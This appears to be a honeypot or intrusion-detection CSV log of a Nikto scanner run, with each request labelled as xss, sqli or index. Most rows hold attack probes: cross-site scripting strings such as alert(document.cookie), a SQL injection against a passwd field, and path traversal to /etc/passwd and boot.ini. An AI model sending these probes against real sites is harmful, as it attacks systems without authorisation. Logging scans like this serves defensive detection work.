timestamp,method,path,status,ip,port,uuid,sess_uuid,detection_name,detection_type,user_agent,referer
2025-05-20T07:32:24.622711,GET,"/eventum/forgot_password.php?email=\""><script>alert(document.cookie)</script>",200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,a1257834-f711-4cbf-819f-60f432ddde22,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001383),
2025-05-20T07:32:24.631102,GET,/forum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;,200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,b2026510-1309-4680-a296-ad32df4f7d4f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001453),
2025-05-20T07:32:24.637035,GET,/zorum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;,200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,bf961890-5445-42ec-bcb5-dd31c661cfd8,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001454),
2025-05-20T07:32:24.642511,GET,"/login/sm_login_screen.php?error=\""><script>alert('Vulnerable')</script>",200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,1714d1ac-587d-4a70-8b30-28681b2a94f5,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001456),
2025-05-20T07:32:24.651506,GET,"/login/sm_login_screen.php?uid=\""><script>alert('Vulnerable')</script>",200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,308f6ddc-8ea3-489f-b9ae-7d58d97ab97b,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001457),
2025-05-20T07:32:24.659907,GET,"/SPHERA/login/sm_login_screen.php?error=\""><script>alert('Vulnerable')</script>",200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,1160d4da-8dea-4553-ac97-871178f816b5,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001458),
2025-05-20T07:32:24.668695,GET,"/SPHERA/login/sm_login_screen.php?uid=\""><script>alert('Vulnerable')</script>",200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,9859ac0a-6c00-43b3-9a98-119bf3f7eeed,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001459),
2025-05-20T07:32:24.680372,GET,"/acart2_0/signin.asp?msg=<script>alert(\""test\"")</script>",200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,9a466d7a-5f53-454e-b088-bdf4efa332b7,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001460),
2025-05-20T07:32:24.688339,GET,/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../boot.ini,200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,0e81476b-b71d-4afe-8e9d-8b2d4ccda627,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001469),
2025-05-20T07:32:24.693289,GET,/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../etc/passwd,200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,ae28bfdc-5d1d-4f96-b4ac-7990cd0c40ae,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001470),
2025-05-20T07:32:24.699680,GET,"/index.php?vo=\""><script>alert(document.cookie);</script>",200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,230e1e17-6bdd-41f6-bf7e-127070a7de14,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001487),
2025-05-20T07:32:24.708379,GET,/admin/database/wwForum.mdb,200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,59b5fc0b-7270-453b-bd47-6b4da2cd4585,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001490),
2025-05-20T07:32:24.714371,GET,/shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>,200,172.18.0.1,57920,6fd7ef35-b057-461d-aaec-677f18cc692b,bf3ae5cc-bbdd-4628-8dcb-3547962ff5be,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001503),
2025-05-20T07:32:24.725357,GET,/banners.php?op=EmailStats&cid=1%20AND%20passwd%20LIKE%20'a%'/*,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,055b960e-b90e-4583-8985-bfee41b52e7f,sqli,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001506),
2025-05-20T07:32:24.733671,GET,/showmail.pl?Folder=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,cb81afd8-7c41-4960-8f65-87441cfa4edd,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001510),
2025-05-20T07:32:24.743921,GET,"/search.asp?Search=\"">&lt;script&gt;alert(Vulnerable)&lt;/script&gt;",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,8790a19c-c047-4a06-ae0d-cb300c0d73cf,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003017),
2025-05-20T07:32:24.750800,GET,/firewall/policy/dlg?q=-1&fzone=t<script>alert('Vulnerable')</script>>&tzone=dmz,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,0ed8dbaa-bf0d-4830-be81-a84752738046,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003030),
2025-05-20T07:32:24.760294,GET,/firewall/policy/policy?fzone=internal&tzone=dmz1<script>alert('Vulnerable')</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,68bc2c8b-6adf-4f62-87bf-29f8bda9e7c6,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003031),
2025-05-20T07:32:24.768422,GET,/antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,d0098cfc-8b01-4284-ba50-8be48389ac98,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003032),
2025-05-20T07:32:24.777999,GET,/antispam/listdel?file=whitelist&name=a<script>alert('Vulnerable')</script>&startline=0(naturally),200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,248c116c-0917-42da-b97f-fbb26b01e574,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003033),
2025-05-20T07:32:24.786221,GET,"/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter,/system/status/session",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,adff47ac-7037-48d9-98ab-68b72bc63adc,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003034),
2025-05-20T07:32:24.791787,GET,"/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\""><script>alert('Vulnerable')</script>,/system/status/session",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,a4547eeb-1edf-4acc-b3bd-e0d659d30762,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003035),
2025-05-20T07:32:24.800231,GET,"/theme1/selector?button=status,monitor,session&button_url=/system/status/status\""><script>alert('Vulnerable')</script>,/system/status/moniter,/system/status/session",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,45aaddb7-5d02-46fa-896b-a08362dcaf72,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003036),
2025-05-20T07:32:24.809675,GET,"/theme1/selector?button=status,monitor,session\""><script>alert('Vulnerable')</script>&button_url=/system/status/status,/system/status/moniter,/system/status/session",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,b68f3cdb-3b42-4c14-8619-319fae34cde2,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003037),
2025-05-20T07:32:24.817805,GET,/search.asp?Search=,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,70d46b25-1fb4-4e3d-94af-f247224b81f1,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003038),
2025-05-20T07:32:24.823623,GET,/examplesWebApp/InteractiveQuery.jsp?person=<script>alert('Vulnerable')</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,da69264d-6e6c-492e-917d-0adc14742c7c,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003081),
2025-05-20T07:32:24.833751,GET,/sgdynamo.exe?HTNAME=<script>alert('Vulnerable')</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,0aac9954-d4df-4a55-b147-1881014af9b1,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003083),
2025-05-20T07:32:24.844378,GET,/aktivate/cgi-bin/catgy.cgi?key=0&cartname=axa200135022551089&desc=<script>alert('Vulnerable')</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,112a4d34-f6f6-41f5-83da-8f66edd7b868,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003086),
2025-05-20T07:32:24.852814,GET,/webcalendar/colors.php?color=</script><script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,19e12c9c-5165-4cbc-a693-d9e195fbc90f,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003117),
2025-05-20T07:32:24.861257,GET,"/webcalendar/week.php?user=\""><script>alert(document.cookie)</script>",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,ad341268-fb1b-4e52-a223-c68d4037ec0b,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003118),
2025-05-20T07:32:24.870181,GET,/debug/dbg?host==<script>alert('Vulnerable');</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,8d47d25d-f265-4084-816c-c40b20d254ce,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003122),
2025-05-20T07:32:24.878983,GET,/debug/echo?name=<script>alert('Vulnerable');</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,ca5ec1a2-d42f-4cd8-bbfc-a5d69564f10f,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003123),
2025-05-20T07:32:24.888383,GET,/debug/errorInfo?title===<script>alert('Vulnerable');</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,e492072d-3074-43e7-b620-d5f81a2150f9,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003124),
2025-05-20T07:32:24.896964,GET,/debug/showproc?proc===<script>alert('Vulnerable');</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,da02d21b-b994-4e8d-a6e3-748cbda9653a,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003125),
2025-05-20T07:32:24.905554,GET,/search.php?sess=your_session_id&lookfor=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,58de33d7-5462-4576-aa78-9cee6a824e49,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003150),
2025-05-20T07:32:24.910606,GET,"/addressbook.php?\""><script>alert(Vulnerable)</script><!--",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,14172a78-8128-44b1-9311-c8165dc64385,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003170),
2025-05-20T07:32:24.917558,GET,/options.php?optpage=<script>alert('Vulnerable!')</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,f7869a0d-120e-4f52-af75-f134f3b98620,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003171),
2025-05-20T07:32:24.926136,GET,/search.php?mailbox=INBOX&what=x&where=<script>alert('Vulnerable!')</script>&submit=Search,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,d11b3246-e3a7-479f-86c9-3fc936575d2b,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003172),
2025-05-20T07:32:24.935428,GET,/help.php?chapter=<script>alert('Vulnerable')</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,abd026d1-2736-40c2-9698-204d9fc0f9c5,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003173),
2025-05-20T07:32:24.944534,GET,/src/read_body.php?mailbox=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&passed_id=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&startMessage=1&show_more=0,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,1cdb7a94-90c6-4d78-842f-6f1d14407f06,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003174),
2025-05-20T07:32:24.952874,GET,"/acart2_0/deliver.asp?msg=<script>alert(\""test\"")</script>",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,933b3bb2-0d2a-4ee6-8aa5-86b1d6726b41,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003185),
2025-05-20T07:32:24.962136,GET,"/acart2_0/error.asp?msg=<script>alert(\""test\"")</script>",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,0845e79a-fef5-4676-b822-9052cbdd3e59,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003186),
2025-05-20T07:32:24.970316,GET,"/acart2_0/admin/error.asp?msg=<script>alert(\""test\"")</script>",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,39ef63d0-3019-48c2-9f53-565012783714,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003187),
2025-05-20T07:32:24.980576,GET,"/acart2_0/admin/index.asp?msg=<script>alert(\""test\"")</script>",200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,9855cbe8-6e0f-4d6e-9230-583d01aac7b8,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003188),
2025-05-20T07:32:24.988460,GET,/wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,09f49a39-1906-4601-bdcb-2192c39ee5b2,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003226),
2025-05-20T07:32:24.997535,GET,/sysuser/docmgr/create.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,5828d862-4183-4473-b79e-b18a027f9a43,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003227),
2025-05-20T07:32:25.008380,GET,/sysuser/docmgr/edit.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,1bf86944-4fed-4d90-b11d-5686d6fb1d3a,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003228),
2025-05-20T07:32:25.016633,GET,/sysuser/docmgr/ftp.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,c9e5eba2-7cb3-41c3-9231-f1a553a47571,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003229),
2025-05-20T07:32:25.026548,GET,/sysuser/docmgr/htaccess.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,634cf289-0002-4b26-bb17-5f6b93111fc7,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003230),
2025-05-20T07:32:25.034760,GET,/sysuser/docmgr/iecreate.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,b9b8a1ae-c841-4a38-b911-2c123780bc97,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003231),
2025-05-20T07:32:25.044286,GET,/sysuser/docmgr/ieedit.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,66b18dd1-32c1-473b-b42f-b488bfa276d1,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003232),
2025-05-20T07:32:25.054783,GET,/sysuser/docmgr/info.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,fadcff87-c72b-4a4a-9630-a49a680a5eb2,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003233),
2025-05-20T07:32:25.063646,GET,/sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,726a865f-90ed-4fb8-96a5-92865fd869e3,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003234),
2025-05-20T07:32:25.073856,GET,/sysuser/docmgr/rename.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,b3a57a08-9f9d-4a89-b2de-ef99fef6c73e,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003235),
2025-05-20T07:32:25.082294,GET,/sysuser/docmgr/search.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,5720f879-b0e2-4be2-b02c-9ecf6f6f1637,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003236),
2025-05-20T07:32:25.091595,GET,/sysuser/docmgr/sendmail.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,b3889eb3-efdb-4abb-8c8f-df42c80ea16c,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003237),
2025-05-20T07:32:25.101786,GET,/sysuser/docmgr/template.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,01123e7d-17ca-4179-ada4-fbb33cb129ae,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003238),
2025-05-20T07:32:25.111821,GET,/sysuser/docmgr/update.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,d2a4fd99-22d9-481c-a4d4-c832724b175d,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003239),
2025-05-20T07:32:25.120412,GET,/sysuser/docmgr/vccheckin.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,1e27a310-97d9-4138-8b70-555e025231f2,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003240),
2025-05-20T07:32:25.128973,GET,/sysuser/docmgr/vccreate.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,be518ae8-7f61-48db-8e04-503df26cfa7a,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003241),
2025-05-20T07:32:25.137987,GET,/sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,69d56eb9-94be-4d6d-9008-2102232a22af,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003242),
2025-05-20T07:32:25.146603,GET,/sysuser/docmgr/edit.stm?name=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,7549a9ff-63ae-4878-aeac-ea4c26f3fc44,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003243),
2025-05-20T07:32:25.155347,GET,/sysuser/docmgr/ieedit.stm?name=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,2143088f-f894-4f57-9bf7-02e3b9285a63,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003244),
2025-05-20T07:32:25.164232,GET,/sysuser/docmgr/info.stm?name=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,5124bbd4-e8ca-4c57-bfae-13e3ee7771b5,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003245),
2025-05-20T07:32:25.172664,GET,/sysuser/docmgr/rename.stm?name=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,98c1d2fb-6dc3-47fa-8b32-2fc8c0866615,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003246),
2025-05-20T07:32:25.181367,GET,/sysuser/docmgr/sendmail.stm?name=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,00681af6-b5dd-4afe-8929-c4cc49c22bef,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003247),
2025-05-20T07:32:25.191564,GET,/sysuser/docmgr/update.stm?name=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,8fefa003-2b26-4c23-a7ac-596a5e953844,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003248),
2025-05-20T07:32:25.200507,GET,/sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,5e246d48-a171-45e8-b4d3-04dcf8954233,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003249),
2025-05-20T07:32:25.209153,GET,/sysuser/docmgr/vccreate.stm?name=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,101c69d2-1288-4747-a8b4-33e362cfc973,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003250),
2025-05-20T07:32:25.217819,GET,/sysuser/docmgr/vchist.stm?name=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,0229e9b2-eca7-4bb0-9400-254a965f3c42,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003251),
2025-05-20T07:32:25.226850,GET,/syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,d65ac226-95af-4e55-b7ab-3abce4176dd8,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003254),
2025-05-20T07:32:25.236337,GET,/syshelp/stmex.stm?foo=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,ad91b23d-7de4-4c1f-bfd2-5da10f477957,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003255),
2025-05-20T07:32:25.245395,GET,/syshelp/cscript/showfunc.stm?func=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,9d25b06c-a942-455c-9b27-c4bc01e66df2,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003256),
2025-05-20T07:32:25.253491,GET,/syshelp/cscript/showfncs.stm?pkg=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,7716fc49-6f87-4e33-8d7e-f5ffbbed8545,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003257),
2025-05-20T07:32:25.262967,GET,/syshelp/cscript/showfnc.stm?pkg=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,46c1c60e-9db6-4bbd-91f1-a1afb3e3bc6e,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003258),
2025-05-20T07:32:25.271862,GET,/netutils/ipdata.stm?ipaddr=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,c9bab372-649a-4255-b308-5370931b4a49,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003259),
2025-05-20T07:32:25.283114,GET,/netutils/findata.stm?host=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,ccb5412c-6d75-425c-9a67-93406d022b04,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003260),
2025-05-20T07:32:25.292170,GET,/netutils/findata.stm?user=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,7fc88d9a-974a-4541-9b85-d0dfd1d4a1e7,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003261),
2025-05-20T07:32:25.300566,GET,/sysuser/docmgr/search.stm?query=<script>alert(document.cookie)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,9bbd2013-5ba6-43fc-b6bb-68e58fb9710f,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003262),
2025-05-20T07:32:25.309830,GET,/webtools/bonsai/cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('Vulnerable')</script>&branch=HEAD,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,fe914cd6-2023-406e-95c3-97f964dc02a2,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003274),
2025-05-20T07:32:25.318157,GET,/webtools/bonsai/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,c9d14a69-ad92-4805-b54a-3321aee9f2ed,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003276),
2025-05-20T07:32:25.327372,GET,/webtools/bonsai/cvsquery.cgi?module=<script>alert('Vulnerable')</script>&branch=&dir=&file=&who=<script>alert(document.domain)</script>&sortby=Date&hours=2&date=week,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,756513ef-8256-4755-af1e-28995f9141f7,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003277),
2025-05-20T07:32:25.336255,GET,/webtools/bonsai/cvslog.cgi?file=*&rev=&root=<script>alert('Vulnerable')</script>,200,172.18.0.1,57930,6fd7ef35-b057-461d-aaec-677f18cc692b,bca5509a-47cd-4bfe-93a4-e3e08e3d0eed,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003280),
